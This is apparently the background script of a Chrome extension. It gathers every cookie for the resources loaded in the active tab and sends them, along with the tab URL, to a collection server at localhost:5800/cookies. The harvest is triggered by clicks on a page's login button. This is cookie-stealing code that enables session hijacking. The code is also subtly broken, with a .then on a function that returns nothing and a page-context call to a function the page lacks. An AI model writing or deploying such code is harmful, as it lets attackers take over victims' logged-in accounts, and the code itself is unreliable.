'use strict;'

const url = 'http://localhost:5800/cookies';

function getCurrentTab(callback) {
    chrome.tabs.query({
        active: true,
        currentWindow: true
    }, function (tabs) {
        if (tabs[0]) {
            callback(tabs[0].url);
        }
    });
}

function getCookies(callback) {
    chrome.tabs.executeScript({
        code: 'performance.getEntriesByType("resource").map(e => e.name)',
    }, data => {
        if (chrome.runtime.lastError || !data || !data[0]) return;
        const urls = data[0].map(url => url.split(/[#?]/)[0]);
        const uniqueUrls = [...new Set(urls).values()].filter(Boolean);
        Promise.all(
            uniqueUrls.map(url =>
                new Promise(resolve => {
                    chrome.cookies.getAll({
                        url
                    }, resolve);
                })
            )
        ).then(results => {
            // convert the array of arrays into a deduplicated flat array of cookies
            const cookies = [
                ...new Map(
                    [].concat(...results)
                    .map(c => [JSON.stringify(c), c])
                ).values()
            ];
            // do something with the cookies here
            callback(cookies);
        });
    });
};

function postReq(url, content) {
    fetch(url, {
        method: 'post',
        headers: {
            'Accept': 'application/json, text/plain, *.*',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(content)
    });
}

function exportCookies() {
    getCookies((cookies) => {
            getCurrentTab(function(tabUrl) {
                cookies.unshift({"url": tabUrl});
                console.log(cookies);
                return postReq(url, cookies);
            });
        })
        .then((response) => {
            console.log(response);
        })
        .catch((error) => {
            console.log(error);
        });

}

chrome.tabs.executeScript({
  code: 'document.getElementById(\'loginbutton\').addEventListener(\'click\', function() { exportCookies(); });'
});

chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    chrome.tabs.sendMessage(tabs[0].id, {
        createDiv: {
            width: "100px", height: "100px", innerHTML: "Hello"}}, function(response) {
        console.log(response.confirmation);
    });
});
//chrome.browserAction.onClicked.addListener(exportCookies);
